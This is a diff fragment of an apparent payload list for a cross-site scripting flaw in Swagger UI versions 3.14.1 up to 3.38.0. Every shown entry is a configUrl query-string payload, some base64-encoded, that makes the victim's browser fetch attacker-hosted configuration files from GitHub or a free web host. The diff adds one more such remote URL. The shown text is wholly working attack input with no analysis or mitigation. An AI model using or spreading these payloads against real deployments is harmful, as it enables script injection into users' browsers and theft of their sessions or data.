@@ -9,6 +9,7 @@ Swagger UI version affected: `>=3.14.1` &lt; `3.38.0`
 4. `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F5ZGlsZmFocmkvc3dhZ2dlci11aS14c3MvbWFpbi94c3MtZmV0Y2gueWFtbCIKfQ==`
 5. `/classicapi/doc/?configUrl=data:text/html;base64,base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F5ZGlsZmFocmkvc3dhZ2dlci11aS14c3MvbWFpbi94c3MtZmV0Y2gueWFtbCIKfQ==`
 6. `?configUrl=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/xss-fetch2.yaml`
+7. `?configUrl=https://ablush-dresses.000webhostapp.com/config.json`
 
 
 
